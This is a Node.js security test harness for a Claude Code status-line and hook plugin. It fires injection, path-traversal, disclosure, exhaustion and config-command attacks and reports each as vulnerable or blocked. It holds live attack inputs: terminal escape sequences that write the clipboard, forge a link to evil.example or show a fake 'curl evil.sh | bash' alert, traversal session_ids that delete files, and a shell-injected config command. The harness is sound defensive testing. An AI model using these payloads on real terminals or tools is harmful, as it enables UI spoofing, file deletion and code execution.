#!/usr/bin/env node
'use strict';
// Adversarial harness. Each case ATTEMPTS an attack and reports whether it
// succeeded. Run against a throwaway HOME.

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execFileSync, spawnSync } = require('child_process');

const HOME = process.env.HOME;
const ROOT = path.join(HOME, '.claude', 'didyouknow');
const BIN = path.join(ROOT, 'bin');
const SL = path.join(BIN, 'statusline.js');
const HOOK = path.join(BIN, 'hook.js');

// This harness is destructive by design: it creates canary files in $HOME and
// deletes one named IMPORTANT.txt. Refuse to run against a real home directory.
// os.homedir() honours $HOME, so it cannot tell a scratch dir from the real
// thing -- os.userInfo() reads the password database and ignores $HOME.
let realHome = null;
try {
  realHome = os.userInfo().homedir;
} catch {}
if (HOME === realHome && process.env.DYK_AUDIT_ALLOW_DESTRUCTIVE !== '1') {
  console.error(`
Refusing to run: HOME is your real home directory (${HOME}).

This harness writes canary files into $HOME and deletes $HOME/IMPORTANT.txt.
Run it against a throwaway home instead:

  mkdir -p /tmp/dyk-audit/.claude
  HOME=/tmp/dyk-audit node cli.js install
  HOME=/tmp/dyk-audit node audit.js

Set DYK_AUDIT_ALLOW_DESTRUCTIVE=1 to override.
`);
  process.exit(2);
}

if (!fs.existsSync(SL)) {
  console.error(`\nNo install found at ${ROOT}.\nRun: HOME=${HOME} node cli.js install\n`);
  process.exit(2);
}

let vulns = 0;
const VULN = (id, s) => { vulns++; console.log(`  \x1b[31m● VULNERABLE\x1b[0m  ${id}  ${s}`); };
const SAFE = (id, s) => console.log(`  \x1b[32m○ blocked\x1b[0m     ${id}  ${s}`);

function statusline(obj, cols = 100) {
  const r = spawnSync(process.execPath, [SL], {
    input: JSON.stringify(obj), encoding: 'utf8',
    env: { ...process.env, COLUMNS: String(cols) }, timeout: 10000,
  });
  return (r.stdout || '') + (r.stderr || '');
}
function hook(obj) {
  return spawnSync(process.execPath, [HOOK], {
    input: JSON.stringify(obj), encoding: 'utf8', timeout: 10000,
  });
}
function seedFacts(sid, arr) {
  fs.writeFileSync(path.join(ROOT, `${sid}.working`), '');
  fs.writeFileSync(path.join(ROOT, `${sid}.facts.json`), JSON.stringify(arr));
}

console.log('\n\x1b[1mA. Terminal escape injection via model-generated fact text\x1b[0m');
console.log('   The fact string comes from an LLM and is written straight to the tty.\n');

// A1: OSC 52 -- writes to the user's system clipboard
seedFacts('a1', ['\x1b]52;c;aGVsbG8gZnJvbSB0aGUgc3RhdHVzIGxpbmU=\x07harmless looking text']);
let out = statusline({ session_id: 'a1', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
out.includes('\x1b]52;')
  ? VULN('A1', 'OSC 52 reaches terminal -> writes attacker data to system clipboard')
  : SAFE('A1', 'OSC 52 clipboard write stripped');

// A2: OSC 8 -- forge a clickable hyperlink
seedFacts('a2', ['\x1b]8;;https://evil.example/pwn\x07Click for Anthropic docs\x1b]8;;\x07']);
out = statusline({ session_id: 'a2', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
out.includes('\x1b]8;;https://evil')
  ? VULN('A2', 'OSC 8 reaches terminal -> forged clickable link')
  : SAFE('A2', 'OSC 8 hyperlink stripped');

// A3: cursor movement + clear -- overwrite rows above, spoof UI
seedFacts('a3', ['\x1b[2J\x1b[1;1H\x1b[31mSECURITY ALERT: run curl evil.sh | bash\x1b[0m']);
out = statusline({ session_id: 'a3', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
/\x1b\[2J|\x1b\[1;1H/.test(out)
  ? VULN('A3', 'CSI cursor/erase sequences reach terminal -> UI spoofing')
  : SAFE('A3', 'cursor/erase sequences stripped');

// A4: embedded newlines -- inject extra status rows
seedFacts('a4', ['line one\nline two\nline three\nline four']);
out = statusline({ session_id: 'a4', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
out.trim().split('\n').length > 2
  ? VULN('A4', `newlines in fact inject extra rows (${out.trim().split('\n').length} rows)`)
  : SAFE('A4', 'newlines neutralised');

// A5: OSC 0 -- rewrite the terminal window title
seedFacts('a5', ['\x1b]0;pwned\x07normal text']);
out = statusline({ session_id: 'a5', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
out.includes('\x1b]0;')
  ? VULN('A5', 'OSC 0 reaches terminal -> window title hijack')
  : SAFE('A5', 'OSC 0 stripped');

console.log('\n\x1b[1mB. Path traversal via session_id\x1b[0m');
console.log('   session_id lands directly in a filesystem path.\n');

// B1: arbitrary file WRITE via marker creation (note the .working suffix)
for (const f of fs.readdirSync(HOME)) if (/CANARY/.test(f)) fs.rmSync(path.join(HOME, f), { force: true });
hook({ hook_event_name: 'UserPromptSubmit', session_id: '../../CANARY_WRITE', prompt: 'build me a to-do list application for iOS' });
fs.readdirSync(HOME).some((f) => /CANARY_WRITE/.test(f))
  ? VULN('B1', `traversal wrote outside ROOT -> ~/${fs.readdirSync(HOME).find((f) => /CANARY_WRITE/.test(f))}`)
  : SAFE('B1', 'marker write confined to ROOT');

// B2: arbitrary file DELETE via marker cleanup
const victim = path.join(HOME, 'IMPORTANT.txt');
fs.writeFileSync(victim, 'do not delete');
hook({ hook_event_name: 'Stop', session_id: '../../IMPORTANT.txt' });
!fs.existsSync(victim)
  ? VULN('B2', 'traversal deleted an arbitrary file via Stop hook')
  : SAFE('B2', 'unlink confined to ROOT');
fs.rmSync(victim, { force: true });

// B3: absolute path as session_id
const abs = path.join(HOME, 'ABS_CANARY');
fs.rmSync(abs, { force: true });
hook({ hook_event_name: 'UserPromptSubmit', session_id: abs, prompt: 'build me a to-do list application for iOS' });
fs.existsSync(abs) || fs.existsSync(abs + '.working')
  ? VULN('B3', 'absolute session_id escaped ROOT')
  : SAFE('B3', 'absolute session_id rejected');

// B4: statusline reads an attacker-planted facts file outside ROOT
{
  const evil = '/tmp/dyk_evil';
  fs.mkdirSync(evil, { recursive: true });
  fs.writeFileSync(path.join(evil, 'x.facts.json'), JSON.stringify(['LEAKED_FROM_OUTSIDE_ROOT']));
  fs.writeFileSync(path.join(evil, 'x.working'), '');
  const rel = path.relative(ROOT, path.join(evil, 'x'));
  out = statusline({ session_id: rel, model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
  out.includes('LEAKED_FROM_OUTSIDE_ROOT')
    ? VULN('B4', 'statusline read a facts file outside ROOT via traversal')
    : SAFE('B4', 'statusline read confined to ROOT');
}

// B5: sanitised fact text must still render normally (no over-blocking)
seedFacts('b5', ['Kanban was designed for Toyota supply chains, not software.']);
out = statusline({ session_id: 'b5', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
out.includes('Kanban was designed for Toyota')
  ? SAFE('B5', 'benign fact text renders unchanged (no false positives)')
  : VULN('B5', 'REGRESSION: sanitiser is eating legitimate text');

console.log('\n\x1b[1mC. Information disclosure\x1b[0m\n');

// C1: prompt visible in process table
{
  const secret = 'ROTATE_THIS_TOKEN_sk-live-9f3a2b';
  const r = spawnSync(process.execPath, [HOOK], {
    input: JSON.stringify({ hook_event_name: 'UserPromptSubmit', session_id: 'c1', prompt: `refactor auth using ${secret} as the key` }),
    encoding: 'utf8', timeout: 5000,
  });
  // race the detached child's argv
  let seen = false;
  const deadline = Date.now() + 2500;
  while (Date.now() < deadline && !seen) {
    try {
      const ps = execFileSync('ps', ['-eo', 'args'], { encoding: 'utf8' });
      if (ps.includes(secret)) seen = true;
    } catch {}
  }
  seen
    ? VULN('C1', 'user prompt exposed in argv -> readable by any local user via ps')
    : SAFE('C1', 'prompt not passed via argv');
}

// C2: directory permissions
{
  const m = (fs.statSync(ROOT).mode & 0o777).toString(8);
  const mc = (fs.statSync(path.join(ROOT, 'cache')).mode & 0o777).toString(8);
  (parseInt(m, 8) & 0o077) || (parseInt(mc, 8) & 0o077)
    ? VULN('C2', `dirs group/other-accessible (root=${m} cache=${mc}) -> local users can read your task history`)
    : SAFE('C2', `dirs are owner-only (root=${m} cache=${mc})`);
}

console.log('\n\x1b[1mD. Resource exhaustion\x1b[0m\n');

// D1: huge stdin
{
  const big = JSON.stringify({ session_id: 'd1', pad: 'x'.repeat(40 * 1024 * 1024), model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
  const t = Date.now();
  const r = spawnSync(process.execPath, [SL], { input: big, encoding: 'utf8', env: { ...process.env, COLUMNS: '100' }, timeout: 15000 });
  const ms = Date.now() - t;
  ms > 3000 || r.status !== 0
    ? VULN('D1', `40MB stdin took ${ms}ms / status ${r.status} -> status line stalls`)
    : SAFE('D1', `40MB stdin handled in ${ms}ms`);
}

// D2: enormous fact array
{
  seedFacts('d2', Array.from({ length: 200000 }, (_, i) => `fact number ${i} about the domain`));
  const t = Date.now();
  statusline({ session_id: 'd2', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
  const ms = Date.now() - t;
  ms > 1000 ? VULN('D2', `200k-entry fact file took ${ms}ms`) : SAFE('D2', `200k-entry fact file handled in ${ms}ms`);
}

console.log('\n\x1b[1mE. Config-driven command execution\x1b[0m\n');

// E1: baseCommand is run through a shell
{
  const cfgPath = path.join(ROOT, 'config.json');
  const cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
  const pwn = path.join(HOME, 'PWNED_BY_CONFIG');
  fs.rmSync(pwn, { force: true });
  cfg.baseCommand = `touch ${pwn}; echo ok`;
  fs.writeFileSync(cfgPath, JSON.stringify(cfg));
  statusline({ session_id: 'e1', model: { display_name: 'O' }, workspace: { current_dir: '/t' }, context_window: { used_percentage: 1 } });
  fs.existsSync(pwn)
    ? VULN('E1', 'config.json baseCommand executes via shell (write-to-config => RCE)')
    : SAFE('E1', 'baseCommand did not execute');
  delete cfg.baseCommand;
  fs.writeFileSync(cfgPath, JSON.stringify(cfg));
  fs.rmSync(pwn, { force: true });
}

console.log(`\n\x1b[1m${vulns} finding(s)\x1b[0m\n`);
process.exit(0);
